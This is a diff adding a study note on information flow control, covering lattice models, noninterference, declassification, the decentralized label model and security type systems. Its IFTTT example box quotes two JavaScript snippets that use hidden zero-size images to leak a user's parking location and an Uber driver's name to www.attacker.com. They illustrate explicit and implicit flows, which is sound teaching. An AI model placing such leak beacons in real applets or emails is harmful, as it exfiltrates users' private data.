@@ -1,0 +1,639 @@
+# 🧑🏻‍🦽‍➡️ Information Flow & Information Flow Control (IFC)
+
+[TOC]
+
+
+
+## Res
+### Related Topics
+↗ [Information Theory](../../../../../../../../🧮%20Mathematics/🥸%20Information%20Theory/Information%20Theory.md)
+
+↗ [Lattice (Order Theory)](../../../../../../../../🧮%20Mathematics/🤼‍♀️%20Mathematical%20Logic%20(Foundations%20of%20Mathematics)/🛒%20Set%20Theory%20&%20Axiomatic%20Set%20Theory/👬%20Relation%20&%20Relation%20Theory/Partial%20Order%20&%20Order%20Theory/Lattice%20(Order%20Theory)/Lattice%20(Order%20Theory).md)
+
+↗ [Cryptology & Secure Communication](../../../../../../🚬%20Cryptology%20&%20Secure%20Communication/Cryptology%20&%20Secure%20Communication.md)
+↗ [Cybersecurity Basics & Information Security (InfoSec)](../../../../../Cybersecurity%20Basics%20&%20Information%20Security%20(InfoSec).md)
+
+↗ [Access Control (访问控制)](../../../../../../⛈️%20Risk%20Management/🐺%20Risk%20Countermeasures%20&%20Security%20Control/Identity%20&%20Access%20Management%20(IAM)/Access%20Control%20(访问控制)/Access%20Control%20(访问控制).md)
+
+
+### Other Resources
+[南大软分课程笔记｜13 静态分析在安全领域的应用](https://blog.wohin.me/posts/nju-program-analysis-13/)
+
+
+
+## Intro: Information Flow Security (信息流安全)
+> [!Abstract]
+> IFC studies **how information flows** between the different variables in a program $P$.
+> - A variable $x$ could be a data variable, a file, the execution time of $P$, etc.
+> 
+> Basic Types of Flows
+> - **Explicit flows**  
+> 	- e.g., in $y := x + 1$, information flows from $x$ to $y$.
+> - **Implicit flows**  
+>   e.g., in $\text{if } x > 0 \text{ then } y := 1 \text{ else } y := 2,$ information flows from $x$ to $y$.
+> 
+> **Security Policies**
+> Security policies specify the desired flows.  
+> 
+> **Enforcement Mechanism**
+> An enforcement mechanism scans the program and detects if there is any information flow that violates the given security policy.
+> - Dennings' approach (lattice)
+> - Volpano's approach (type system)
+> - Myers' approach (lattice)
+
+> 🔗 https://blog.wohin.me/posts/nju-program-analysis-13/
+
+[Dorothy E. Denning](https://en.wikipedia.org/wiki/Dorothy_E._Denning)于1976年在论文 [_A Lattice Model of Secure Information Flow_](https://courses.cs.washington.edu/courses/cse590s/02sp/secure-information-flow.pdf) 提出，一个系统需要访问（access）和流（flow）控制来满足所有安全要求。
+
+访问控制（access control）用来确保程序有权限访问特定信息，主要关心**信息是如何被访问**的。
+
+信息流安全则是一种端到端的思路，通过追踪信息流通过一个程序的过程，确保该程序能够安全地处理信息，主要关心**信息是如何被传播**的。
+
+Dorothy E. Denning与Peter J. Denning夫妇二人1977年的论文 [_Certification of Programs for Secure Information Flow_](https://www.cs.utexas.edu/~shmat/courses/cs380s/denning.pdf )对信息流做了如下解释：如果变量$x$中的信息被传送到变量$y$，它们之间就建立了一条信息流 $x\to y$。这看起来与我们前面学过的指针分析十分相似。
+
+一种将信息流和安全联系起来的思路是，将不同类型的变量划分到不同的安全等级（security levels），在这些等级之间建立允许的流，从而形成信息流策略。不同实际场景下的安全等级千差万别，可以很复杂也可以很简单。考虑最简单的情况：只有H（高）和L（低）两个安全等级，下面两行代码就分别对应了这两个等级：
+
+```java
+h = getPassword(); // h is high security
+broadcast(l); // l is low security
+```
+
+另外，我们也可以在格（lattice）上对安全等级进行建模（来自前面提到的第一篇论文）：$L\leq H_L \leq H$。
+
+所谓“信息流策略”，用来限制信息流在不同安全等级之间的流动。例如，J. A. Goguen和J. Meseguer于1982年在论文 [_Security Policies and Security Models_](https://www.cs.purdue.edu/homes/ninghui/readings/AccessControl/goguen_meseguer_82.pdf) 中提出了一个信息流策略——不干涉策略（noninterference policy），它要求高安全等级的变量中的信息不应对低安全等级的变量中的信息有任何影响。因此，你也不应该能通过观察低安全等级的变量来获得任何高安全等级的信息。对应到代码上，形如$x_L=y_H$这样的语句就违背了这一信息流策略。
+
+在格的视角下，上述策略可以表达为，应确保信息在安全等级的格中向上流动。
+
+> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)
+
+**Information flow** in an [information theoretical](https://en.wikipedia.org/wiki/Information_theory "Information theory") context is the transfer of information from a [variable](https://en.wikipedia.org/wiki/Random_variable "Random variable") x to a variable y in a given [process](https://en.wikipedia.org/wiki/Stochastic_process "Stochastic process"). Not all flows may be desirable; for example, a system should not leak any confidential information (partially or not) to public observers—as it is a violation of privacy on an individual level, or might cause major loss on a corporate level.
+
+
+### Security Properties of Information
+> [!links]
+> ↗ [Cybersecurity Basics & Information Security (InfoSec)](../../../../../Cybersecurity%20Basics%20&%20Information%20Security%20(InfoSec).md) "🛡️ InfoSec Objectives"
+> ↗ [Cryptology & Secure Communication](../../../../../../🚬%20Cryptology%20&%20Secure%20Communication/Cryptology%20&%20Secure%20Communication.md) "Objective of Cryptology /Secure Communication & Cryptographic Properties ⭐ "
+> 
+> ↗ [Core Cryptographic Properties Threats & Countermeasures](../../../../../../⛈️%20Risk%20Management/🐗%20Cybersecurity%20Threats%20&%20Attacks/Cryptographic%20Properties%20&%20Security/Core%20Cryptographic%20Properties%20Threats%20&%20Countermeasures.md)
+
+> 🔗 https://blog.wohin.me/posts/nju-program-analysis-13/
+
+众所周知，信息安全三要素包括机密性（confidentiality）、完整性（integrity）和可用性（availability）。本节课讨论的是信息流，因此重点关注前两个要素。
+
+确保机密性，通俗意义上就是阻止敏感信息泄露；确保完整性，就是避免不受信的信息污染了受信（重要）的信息（这一说法来自Ken Biba于1977年发表的论文 [_Integrity Considerations for Secure Computer Systems_](https://apps.dtic.mil/sti/pdfs/ADA039324.pdf)）。常见的各种注入问题就是损害了完整性。
+
+有意思的是，结合前面讨论的安全等级相关的知识来看，机密性和完整性恰好是对称的：确保机密性，就是要避免高安全等级的秘密信息流向低安全等级的公开区域，属于读保护；确保完整性，就是要避免低安全等级的不可信信息流向高安全等级的可信区域，属于写保护。
+
+另外，完整性本身也是一个覆盖广泛的概念。它可以包括数据的正确性（correctness）、完全性（completeness）和一致性（consistency）。
+
+
+### Explicit Flows and Side (Covert) Channels
+> [!links]
+> ↗ [Side-Channel Attack (SCA)](../../../../../🪖%20Hardware%20Security/Hardware%20Threats%20&%20Attacks/Side-Channel%20Attack%20(SCA)/Side-Channel%20Attack%20(SCA).md)
+
+> 🔗 https://blog.wohin.me/posts/nju-program-analysis-13/
+
+我们继续来讨论信息流。“信息”本身是一个抽象的概念，它并不等同于数据。信息可能会有两种不同的传播方式：显式流和隐式流（implicit flow）。
+
+前者很简单，例如$x_L=y_H$​这个语句就是通过直接复制/赋值的方式实现信息传递，也就是显式流。隐式流则不那么直观，基于此途径的敏感信息泄露也相对而言不那么好防御。现实中已经有许多这样的例子。例如，在下面的代码片段中，根据$publik_L$的结果，我们将能够推断$secret_H$的正负性：
+
+```java
+secret_H = getSecret();
+if (secret_H < 0) publik_L = 1;
+else publik_L = 0;
+```
+
+敏感信息虽然没有直接传播，但是它影响了控制流，这可能会被低安全等级的观察者观察到。
+
+通过计算系统传递信息的机制被称作信道（channels）。在此基础上，Butler W.Lampson于1973年发表的文章 [_A Note on the Confinement Problem_](https://www.cs.utexas.edu/~shmat/courses/cs380s_fall09/lampson73.pdf)将那些利用本非用于信息传递的机制的信道称为隐蔽信道。一些常见的隐蔽信道包括：
+- 隐式流，通过程序控制结构传递信息。
+- 终止（termination）信道，通过程序的（不）可终止性差异传递信息。
+- 时间（timing）信道，通过计算时间的差异传递信息。
+- 异常（exceptions），通过异常来传递信息。
+
+尽管隐蔽信道比较难识别和防御，它能够传递的信息通常也比显式流少得多。因此，本课程主要关注显式流。一个问题是，如何检测和避免非预期的信息流呢？接下来将要讨论的污点分析是有效的解决方案之一。
+
+> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Explicit_flows_and_side_channels
+
+nformation flows can be divided in two major categories. The simplest one is explicit flow, where some secret is explicitly leaked to a publicly observable variable. In the following example, the secret in the variable _h_ flows into the publicly observable variable _l_.
+```
+var l, h
+l := h
+```
+
+The other flows fall into the [side channel](https://en.wikipedia.org/wiki/Side_channel_attack "Side channel attack") category. For example, in the [timing attack](https://en.wikipedia.org/wiki/Timing_attack "Timing attack") or in the [power analysis attack](https://en.wikipedia.org/wiki/Power_analysis "Power analysis"), the system leaks information through, respectively, the time or power it takes to perform an action depending on a secret value.
+
+In the following example, the attacker can deduce if the value of _h_ is one or not by the time the program takes to finish:
+```
+var l, h
+if h = 1 then
+    (* do some time-consuming work *)
+l := 0
+```
+
+Another side channel flow is the implicit information flow, which consists in leakage of information through the program [control flow](https://en.wikipedia.org/wiki/Control_flow "Control flow"). The following program (implicitly) discloses the value of the secret variable _h_ to the variable _l_. In this case, since the _h_ variable is boolean, all the bits of the variable of _h_ is disclosed (at the end of the program, _l_ will be 3 if _h_ is true, and 42 otherwise).
+
+```
+var l, h
+if h = true then
+    l := 3
+else
+    l := 42
+```
+
+> [!Abstract] A introducing example
+> 
+> 📄 Bastys, Iulia, Musard Balliu, and Andrei Sabelfeld. "If this then what? Controlling flows in IoT apps." _Proceedings of the 2018 ACM SIGSAC conference on computer and communications security_. 2018.
+> 
+> IoT apps empower users by connecting a variety of otherwise unconnected services. These apps (or applets) are triggered by external information sources to perform actions on external information sinks. We demonstrate that the popular IoT app platforms, including IFTTT (If This Then That), Zapier, and Microsoft Flow are susceptible to attacks by malicious applet makers, including stealthy privacy attacks to exfiltrate private photos, leak user location, and eavesdrop on user input to voice-controlled assistants. We study a dataset of 279,828 IFTTT applets from more than 400 services, classify the applets according to the sensitivity of their sources, and find that 30% of the applets may violate privacy. We propose two countermeasures for short- and longterm protection: access control and information flow control. For short-term protection, we suggest that access control classifies an applet as either exclusively private or exclusively public, thus breaking flows from private sources to sensitive sinks. For longterm protection, we develop a framework for information flow tracking in IoT apps. The framework models applet reactivity and timing behavior, while at the same time faithfully capturing the subtleties of attacker observations caused by applet output. We show how to implement the approach for an IFTTT-inspired setting leveraging state-of-the-art information flow tracking techniques for JavaScript based on the JSFlow tool and evaluate its effectiveness on a collection of applets.
+> 
+> > [!Example] Example: Automatically get an email every time you park your car with a map where you're parked.  
+> > 
+> > ```javascript  
+> > var loc = encodeURIComponent(ParkLocationURL)  
+> > var attack = '<img src=\"www.attacker.com?' + loc + '\" style=\"width:0px;height:0px;\">'  
+> > var ifttt_logo = '<img src=\"www.ifttt.com/logo.png\" style=\"width:100px;height:100px;\">' 
+> >   
+> > Email.sendEmail.setBody('I parked at ' + loc + ifttt_logo + attack)
+> > ```
+> > 
+> > Example of <span style="color:red;">Explicit Information Flow</span>: the sensitive information <span style="color:blue;">loc</span> has been <span style="color:red;">leaked</span> to <span style="color:red;">www.attacker.com</span>.
+> 
+> 
+> > [!Example] Another example: After an Uber ride get a trip map:  
+> >   
+> > ```javascript  
+> > var rideMap = Uber.rideCompleted.TripMapImage  
+> > var driver = Uber.rideCompleted.DriverName  
+> >   
+> > for (i = 0; i < driver.len; i++){  
+> >   for (j = 32; j < 127; j++){  
+> >     t = driver[i] == String.fromCharCode(j)  
+> >     if (t){ dst[i] = String.fromCharCode(j) }  
+> >   }  
+> > }  
+> >   
+> > var img = '<img src=\"https://attacker.com?' + dst + '\" style=\"width:0px;height:0px;\">'  
+> >   
+> > Email.sendEmail.setBody(rideMap + img)
+> > 
+> > ```
+> > 
+> > Example of <span style="color:red;">Implicit Information Flow</span>: the sensitive information <span style="color:blue;">driver</span> has been leaked to <span style="color:red;">www.attacker.com</span> —  <span style="color:blue;">without copying the sensitive value into any variable that the attacker learned.</span>
+
+
+### Data Flow Analysis 🆚 Information Flow Analysis 🆚 Taint Analysis
+#data_flow_analysis #information_flow_analysis #taint_analysis #infoSec 
+
+> 🤖 GPT-5.3
+> https://chatgpt.com/share/69e65fac-a358-8387-be0c-b2d19509f87a
+> https://chatgpt.com/share/69e68013-9728-8389-a2f5-fea86da95973
+
+If you remember only one thing:
+- **Data flow analysis** → _Where does data go?_
+- **Information flow analysis** → _Does sensitive info leak?_
+- **Taint analysis** → _Can attacker input reach dangerous code?_
+
+|Concept|Nature|Role|
+|---|---|---|
+|Data flow analysis|Domain + technique (overloaded)|Tracks value movement|
+|Information flow analysis|Domain (security)|Tracks _security-relevant_ flow|
+|Taint analysis|Technique|Practical approximation of IFC|
+
+Data flow and information flow are parallel analysis domains.  
+Information flow analysis often uses dataflow techniques.  
+Taint analysis is a practical technique that sits at the intersection of both.
+
+Key difference
+
+```
+x = y;
+```
+- Data flow: ✔ (value flows)
+- Information flow: ✔ (information flows)
+
+```
+if (secret) {  
+    public = 1;  
+}
+```
+- Data flow: ❌ (no value dependency)
+- Information flow: ✔ (implicit flow)
+
+
+
+## 🎯 Information Flow Policies
+### Noninterference Policy 🤔
+> 🔗 https://en.wikipedia.org/wiki/Non-interference_(security)
+
+Non-interference is a policy that enforces that an attacker should not be able to distinguish two computations from their outputs if they only vary in their secret inputs. However, this policy is too strict to be usable in realistic programs.[4] The classic example is a password checker program that, in order to be useful, needs to disclose some secret information: whether the input password is correct or not (note that the information that an attacker learns in case the program rejects the password is that the attempted password is not the valid one).
+
+
+### Declassification
+> [!links]
+> ↗ [Authentication (身份鉴别)](../../../../../../⛈️%20Risk%20Management/🐺%20Risk%20Countermeasures%20&%20Security%20Control/Identity%20&%20Access%20Management%20(IAM)/Access%20Control%20(访问控制)/Authentication%20(身份鉴别)/Authentication%20(身份鉴别).md) "authentication factors"
+
+> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification
+
+As shown previously, ==non-interference policy is too strict for use in most real-world applications.==[7] Therefore, several approaches to allow controlled releases of information have been devised. Such approaches are called information declassification.
+
+Robust declassification requires that an active attacker may not manipulate the system in order to learn more secrets than what passive attackers already know.[4]
+
+Information declassification constructs can be classified in four orthogonal dimensions: what information is released, who is authorized to access the information, where the information is released, and when the information is released.[4]
+#### What
+> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification
+
+A _what_ declassification policy controls which information (partial or not) may be released to a publicly observable variable.
+
+The following code example shows a **declassify** construct from.[8](https://en.wikipedia.org/wiki/Information_flow_\(information_theory\)#cite_note-sabelfeld04-8) In this code, the value of the variable _h_ is explicitly allowed by the programmer to flow into the publicly observable variable _l_.
+
+```
+var l, h
+if l = 1 then
+    l := declassify(h)
+```
+#### Who
+> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification
+
+A _who_ declassification policy controls which [principals](https://en.wikipedia.org/wiki/Security_principal "Security principal") (i.e., who) can access a given piece of information. This kind of policy has been implemented in the Jif compiler.[9](https://en.wikipedia.org/wiki/Information_flow_\(information_theory\)#cite_note-9)
+
+The following example allows Bob to share its secret contained in the variable _b_ with Alice through the commonly accessible variable _ab_.
+
+```
+var ab                                (* {Alice, Bob} *)
+var b                                 (* {Bob} *)
+if ab = 1 then
+    ab := declassify(b, {Alice, Bob}) (* {Alice, Bob} *)
+```
+#### Where
+> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification
+
+A _where_ declassification policy regulates where the information can be released, for example, by controlling in which lines of the [source code](https://en.wikipedia.org/wiki/Source_code "Source code") information can be released.
+
+The following example makes use of the **flow** construct proposed in.[10](https://en.wikipedia.org/wiki/Information_flow_\(information_theory\)#cite_note-matos05-10) This construct takes a flow policy (in this case, variables in H are allowed to flow to variables in L) and a command, which is run under the given flow policy.
+
+```
+var l, h
+flow H ≺ L in
+    l := h
+```
+#### When
+> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification
+
+A _when_ declassification policy regulates when the information can be released. Policies of this kind can be used to verify programs that implement, for example, controlled release of secret information after payment, or encrypted secrets which should not be released in a certain time given polynomial computational power.
+#### Declassification Approaches for Implicit Flows
+> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification_approaches_for_implicit_flows
+
+An implicit flow occurs when code whose conditional execution is based on private information updates a public variable. This is especially problematic when multiple executions are considered since an attacker could leverage the public variable to infer private information by observing how its value changes over time or with the input.
+
+
+The naïve approach
+> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification_approaches_for_implicit_flows
+
+The naïve approach consists on enforcing the confidentiality property on all variables whose value is affected by other variables. This method leads to partially leaked information due to on some instances of the application a variable is Low and in others High.
+
+Other approaches
+- see below "IFC enforcement machanisms"
+
+
+
+## 🎯 Information Flow Policy Models /Security Policy Framework
+###  Denning's Approach & Lattice Model
+> 📄 Denning, Dorothy E., and Peter J. Denning. "Certification of programs for secure information flow." _Communications of the ACM_ 20.7 (1977): 504-513.
+#### High /Low Security Analysis
+
+> [!Example]
+> 
+> ![|500](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2023.25.27.png)
+> ![|500](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2023.26.37.png)
+
+#### Formalized Security Policy Framework ⭐
+> [!links]
+> ↗ [Partial Order & Order Theory](../../../../../../../../🧮%20Mathematics/🤼‍♀️%20Mathematical%20Logic%20(Foundations%20of%20Mathematics)/🛒%20Set%20Theory%20&%20Axiomatic%20Set%20Theory/👬%20Relation%20&%20Relation%20Theory/Partial%20Order%20&%20Order%20Theory/Partial%20Order%20&%20Order%20Theory.md)
+> ↗ [Lattice (Order Theory)](../../../../../../../../🧮%20Mathematics/🤼‍♀️%20Mathematical%20Logic%20(Foundations%20of%20Mathematics)/🛒%20Set%20Theory%20&%20Axiomatic%20Set%20Theory/👬%20Relation%20&%20Relation%20Theory/Partial%20Order%20&%20Order%20Theory/Lattice%20(Order%20Theory)/Lattice%20(Order%20Theory).md)
+> 
+> ↗ [Access Control (访问控制)](../../../../../../⛈️%20Risk%20Management/🐺%20Risk%20Countermeasures%20&%20Security%20Control/Identity%20&%20Access%20Management%20(IAM)/Access%20Control%20(访问控制)/Access%20Control%20(访问控制).md)
+> ↗ [Access Control Models](../../../../../../⛈️%20Risk%20Management/🐺%20Risk%20Countermeasures%20&%20Security%20Control/Identity%20&%20Access%20Management%20(IAM)/Access%20Control%20(访问控制)/📌%20Access%20Control%20Models/Access%20Control%20Models.md)
+> - ↗ [MAC (Mandatory Access Control)](../../../../../../⛈️%20Risk%20Management/🐺%20Risk%20Countermeasures%20&%20Security%20Control/Identity%20&%20Access%20Management%20(IAM)/Access%20Control%20(访问控制)/📌%20Access%20Control%20Models/MAC%20(Mandatory%20Access%20Control)/MAC%20(Mandatory%20Access%20Control).md)
+> - ↗ [LBAC (Lattice-Based Access Control)](../../../../../../⛈️%20Risk%20Management/🐺%20Risk%20Countermeasures%20&%20Security%20Control/Identity%20&%20Access%20Management%20(IAM)/Access%20Control%20(访问控制)/📌%20Access%20Control%20Models/LBAC%20(Lattice-Based%20Access%20Control)/LBAC%20(Lattice-Based%20Access%20Control).md)
+
+> [!Example] Confidentiality and Integrity in One Go?
+> (Coming from examples in "Volpano-Smith-Irvine")
+> 
+> ![|300](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2022.51.55.png)
+> 
+> Question: How can we become more general?
+> Answer: Security Policy Frameworks for Mandatory Access Control.
+
+A **security policy framework** is a 4-tuple $(S, \sqsubseteq, \sqcup, \sqcap)$ where
+* $S$ is a **finite** and **non-empty** set of **security labels**.
+* $\sqsubseteq: S \times S$ is a **binary relation**
+	* (a) $\sqsubseteq$ is **reflexive** : for all $s \in S : s \sqsubseteq s$
+	* (b) $\sqsubseteq$ is **transitive**: for all $s_1, s_2, s_3 \in S :$ 
+		* $s_1 \sqsubseteq s_2 \land s_2 \sqsubseteq s_3 \implies s_1 \sqsubseteq s_3$
+	* (c) $\sqsubseteq$ is **anti-symmetric**: for all $s_1, s_2 \in S:$
+		* $s_1 \sqsubseteq s_2 \land s_1 \sqsupseteq s_2 \implies s_1 = s_2$
+* $\sqcup: S \times S \to S$ and $\sqcap: S \times S \to S$ are two operations for **combining labels** such that
+	*  for all $s_1, s_2 \in S$:
+		* $s_1 \sqsubseteq s_1 \sqcup s_2 \text{ and } s_2 \sqsubseteq s_1 \sqcup s_2$
+		* $s_1 \sqcap s_2 \sqsubseteq s_1 \text{ and } s_1 \sqcap s_2 \sqsubseteq s_2$
+	* (This condition is basically saying: the Poset $(S, \sqsubseteq)$ is a lattice. Recall the definition of ↗ [Lattice (Order Theory)](../../../../../../../🧮%20Mathematics/🤼‍♀️%20Mathematical%20Logic%20(Foundations%20of%20Mathematics)/🛒%20Set%20Theory%20&%20Axiomatic%20Set%20Theory/👬%20Relation%20&%20Relation%20Theory/Partial%20Order%20&%20Order%20Theory/Lattice%20(Order%20Theory)/Lattice%20(Order%20Theory).md))
+
+> [!Example] Confidentiality and Integrity in One Go
+> 
+> Since $(S, \sqsubseteq)$ is a *lattice*, it allows to depict it nicely by just denoting the direct successors of security classes:
+>
+> ![|300](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2022.51.55.png)
+
+In a security framework $(S, \sqsubseteq, \sqcup, \sqcap)$
+* there is the bottom security label $\perp$ that can be obtained as $s_1 \sqcap s_2 \dots \sqcap s_n$ (if $S = \{s_1, \dots, s_n\}$).
+* there is the top security label $\top$ that can be obtained as $s_1 \sqcup s_2 \dots \sqcup s_n$ (if $S = \{s_1, \dots, s_n\}$).
+
+> [!Example]
+> ![|400](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2022.59.20.png)
+##### Typical Security Policy Frameworks - Components
+
+> [!Example]
+> ![|500](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2023.03.38.png)
+> ![|500](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2023.04.06.png)
+
+##### Combining Security Policy Frameworks - Product Construction
+
+> [!Example]
+> ![|500](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2022.51.55.png)
+##### Non-Interference
+> [!TIP] Theorem (Non-Interference for an arbitrary Security Policy Framework)
+> * Suppose a program $c$ satisfies information flow policy $\gamma$:
+> 	* $\gamma \vdash c : \tau \quad \text{(for any type } \tau, \text{ does not matter)}$
+> * Suppose $\mu_1$ and $\mu_2$ are memories that are equal on all variables up to level $\tau_0$:
+> 	* $\mu_1(x) = \mu_2(x) \text{ for every } x \text{ with } \gamma(x) \sqsubseteq \tau_0$
+> * If we run the program on these memories:
+>   * $\mu_1 \vdash c \Rightarrow \mu_1'$
+>   * $\mu_2 \vdash c \Rightarrow \mu_2'$
+>   (and they both terminate)
+> * ... then the result will be the same on all variables up to level $\tau_0$:
+> 	* $\mu_1'(x) = \mu_2'(x) \text{ for every } x \text{ with } \gamma(x) \sqsubseteq \tau_0$
+
+
+### Decentralized Label Model (DLM) ⭐
+> 📄 Myers, Andrew C., and Barbara Liskov. "A decentralized model for information flow control." _ACM SIGOPS Operating Systems Review_ 31.5 (1997): 129-142.
+
+> [!Example] Introducing
+> What label should match have?
+> 
+> ```
+> pinfo = record [name,password:string{H}]
+> 
+> check_pw (db:array[pinfo]{H}, name:string{L}, password:string{H}) 
+> 	returns ret:bool{L}
+> 	
+> 	i: int{L} :=0;
+> 	match: bool{???} :=false;
+> 	while (i<db.length) do
+> 		if db[i].name=name && db[i].password=password
+> 		then match:=true
+> 		i:=i+1
+> 	
+> 	ret:=match
+> ```
+>
+> ---
+> What we cannot do with classical information flow (Dennings'): release some information that is depending on something classified.
+> - Log in: the password data-base is secret, but the information whether you have entered the right password is not.
+> - Result of an election: the votes are secret/private, but the result is public.
+> - Medical database: the medical records are secret, but they may be released to a researcher after personal information is removed.
+> - Electronic Auction: the max bids of customers is secret at first, but then during bidding they are partially revealed.
+> We thus want a mechanism to explicitly declassify information in a fine-grained way.
+> 
+> ---
+> Classical information flow gives you a strong guarantee:
+> 
+> > An intruder who can only observe the low variables, cannot learn anything about the high variables.
+> 
+> We have logically formalized this guarantee in the previous lecture: non-interference.
+> 
+> > Declassification means that you will lose this guarantee.
+> 
+> - Log in: an intruder can do a guessing attack
+> - Result of an election: you learn a bit about the votes
+> - Medical database: an intruder may be able to reconstruct some information about the patients.
+> - Electronic Auction: an intruder learns a bit about the bids
+> 
+> ---
+> If you give an intruder (dishonest person) some information, you lose all control over it. But the world is more complicated.
+> 
+> Consider a large organization like a hospital:
+> - Even though the hospital itself is honest, it may run some systems that are not secure.
+> - Systems that are designed by honest people could have bugs.
+> - When declassifying information, you may not want to give permission to use the data arbitrarily.
+> 	- There may be a usage policy about using the declassified data, and compliance may be required by law, e.g. GDPR.
+> 	- Similarly, release of data may be subject to usage policy by a contract, e.g., the researchers must make a contract with the hospital to get access to patient data.
+> - How to formally specify such policies and automatically prove compliance?
+
+Andrew C. Myers and Barbara Liskov: _A Decentralized Model for Information Flow Control_, ACM Symposium on Operating System Principles, 1997 [1].
+1. **Security lattice:** instead of high and low we have more complicated security labels:
+    - A set of **owners**: participants or roles who own the respective data
+    - An owner can say who can **read** the data.
+    - You can only read data if **all** owners have allowed it.
+- Defining $⊑, ⊔, ⊓$.
+	- Except for declassification this is standard information flow å la Denning from the last lecture.
+1. **Declassify** limited: an owner can only relax **their own constraint**.
+2. Programs can act **on behalf** of an owner and thus declassify, but this forces programmer to make every declassification explicit, so one does not accidentally **forget** about the rights of some owner.
+
+> [!example] Hospital Domain Example
+> ![|500](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2022.37.23.png)
+#### Security Lattice
+
+#### Ordering
+
+#### Declassification Rule
+
+#### The Act as Relation
+
+#### Declassification
+> [!Example] 
+> 
+> ```
+> pinfo = record [name,password:string{chkr:chkr}]
+> check_pw(db:array[pinfo{⊥}]{⊥}, name:string{⊥}, password:string{client:chkr})
+> 	returns ret:bool{client:chkr}
+> 	
+> 	i: int{chkr:chkr} :=0;
+> 	match: bool{client:chkr,chkr:chkr} :=false;
+> 	while (i<db.length) do
+> 		if db[i].name=name && db[i].password=password
+> 		then match:=true
+> 		i:=i+1
+> 	
+> 	ret:=false
+> 	if_acts_for(check_pw,chkr) then ret:=declassify(match,{client:chkr})
+> ```
+> 
+> - chkr: special authority that owns the password database.
+> - The check pw tries to assume the chkr authority, and, if successful, declassifies match.
+
+
+
+## 🎯 IFC Enforcement Mechanisms
+> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Information_flow_control
+
+A mechanism for _information flow control_ is one that enforces information flow policies. Several methods to enforce information flow policies have been proposed. Run-time mechanisms that tag data with information flow labels have been employed at the [operating system](https://en.wikipedia.org/wiki/Operating_system "Operating system") level and at the [programming language](https://en.wikipedia.org/wiki/Programming_language "Programming language") level. Static program analyses have also been developed that ensure information flows within programs are in accordance with policies.
+
+Both static and dynamic analysis for current programming languages have been developed. However, dynamic analysis techniques cannot observe all execution paths, and therefore cannot be both sound and precise. In order to guarantee noninterference, they either terminate executions that might release sensitive information or they ignore updates that might leak information.
+
+A prominent way to enforce information flow policies in a program is through a [security type system](https://en.wikipedia.org/wiki/Security_type_system "Security type system"): that is, a type system that enforces security properties. In such a sound type system, if a program type-checks, it meets the flow policy and therefore contains no improper information flows.
+
+
+### Static Enforcement
+#### Type-System-Based IFC
+> [!links]
+> ↗ [Type Theory (类型论)](../../../../../../../../🧮%20Mathematics/🤼‍♀️%20Mathematical%20Logic%20(Foundations%20of%20Mathematics)/📍%20Formal%20System,%20Formal%20Logics,%20and%20Its%20Semantics/🪸%20Type%20Theory%20(类型论)/Type%20Theory%20(类型论).md)
+> ↗ [Type Analysis](../../../../../../../../🔑%20CS%20Core/🧞‍♂️%20Programming%20Language%20Processing%20&%20Program%20Execution/🚮%20Program%20Language%20Processing%20&%20Compilation%20Theory%20(Compile-time)/Compilation%20Phase/1️⃣%20Frontend%20-%20Programming%20Language%20Analysis/Semantic%20Analysis/Type%20Analysis/Type%20Analysis.md)
+> ↗ [Type and Effect Systems](../🦖%20Type%20and%20Effect%20Systems/Type%20and%20Effect%20Systems.md)
+
+> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Security_type_system
+
+In a programming language augmented with a security type system every expression carries both a type (such as boolean, or integer) and a security label.
+
+Following is a simple security type system from [1] that enforces non-interference. The notation $\vdash exp : \tau$ means that the expression $exp$ has type $\tau$. Similarly, $[sc] \vdash C$ means that the command $C$ is typable in the security context $sc$.
+$$
+\begin{aligned}
+
+[E1\!-\!2]\quad 
+&\frac{}{\vdash exp : high}
+\qquad
+\frac{h \notin Vars(exp)}{\vdash exp : low}
+\\[10pt]
+
+[C1\!-\!3]\quad 
+&[sc] \vdash skip
+\qquad
+[sc] \vdash h := exp
+\qquad
+\frac{\vdash exp : low}{[low] \vdash l := exp}
+\\[10pt]
+
+[C4\!-\!5]\quad 
+&\frac{[sc] \vdash C_1 \quad [sc] \vdash C_2}{[sc] \vdash C_1; C_2}
+\qquad
+\frac{\vdash exp : sc \quad [sc] \vdash C}{[sc] \vdash while\ exp\ do\ C}
+\\[10pt]
+
+[C6\!-\!7]\quad 
+&\frac{\vdash exp : sc \quad [sc] \vdash C_1 \quad [sc] \vdash C_2}{[sc] \vdash if\ exp\ then\ C_1\ else\ C_2}
+\qquad
+\frac{[high] \vdash C}{[low] \vdash C}
+
+\end{aligned}
+$$
+
+Well-typed commands include, for example,
+$$
+[low] \vdash if\ l = 42\ then\ h := 3\ else\ l := 0.
+$$
+
+Conversely, the program
+$$
+l := 0;\ while\ l < h\ do\ l := l + 1
+$$
+
+is ill-typed, as it will disclose the value of variable $h$ into $l$.
+
+Note that the rule $[C7]$ is a subsumption rule, which means that any command that is of security type $high$ can also be $low$. For example, $h := 1$ can be both $high$ and $low$. This is called polymorphism in type theory. Similarly, the type of an expression $exp$ that satisfies $h \notin Vars(exp)$ can be both $high$ and $low$ according to $[E1]$ and $[E2]$ respectively.
+##### Volpano-Smith-Irvine 🤔
